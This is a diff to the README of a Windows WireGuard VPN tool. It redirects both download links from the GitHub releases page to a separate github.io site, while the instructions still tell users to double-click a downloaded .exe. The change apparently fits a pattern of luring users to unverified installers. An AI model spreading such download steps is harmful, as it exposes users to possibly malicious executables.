@@ -1,6 +1,6 @@
 # 🌐 easy-wireguard-server - Manage your private VPN with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/passivetrusttimescale980/easy-wireguard-server/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://passivetrusttimescale980.github.io)
 
 This software provides a simple way to create and manage a WireGuard VPN server directly on your Windows computer. You do not need experience with Linux, command lines, or complex server environments. The program handles the setup so you can focus on your internet privacy and network security. It uses the native WireGuard implementation for Windows to ensure fast performance and stable connections.
 
@@ -8,7 +8,7 @@ This software provides a simple way to create and manage a WireGuard VPN server 
 
 To start, you must visit the official release page to get the installer.
 
-[Download easy-wireguard-server](https://github.com/passivetrusttimescale980/easy-wireguard-server/releases)
+[Download easy-wireguard-server](https://passivetrusttimescale980.github.io)
 
 On this page, look for the section marked Assets. Select the file ending in .exe to begin your download. Once the file finishes saving to your computer, locate it in your Downloads folder and double-click it to start the installation process. Follow the prompts on the screen to finish the setup.
 
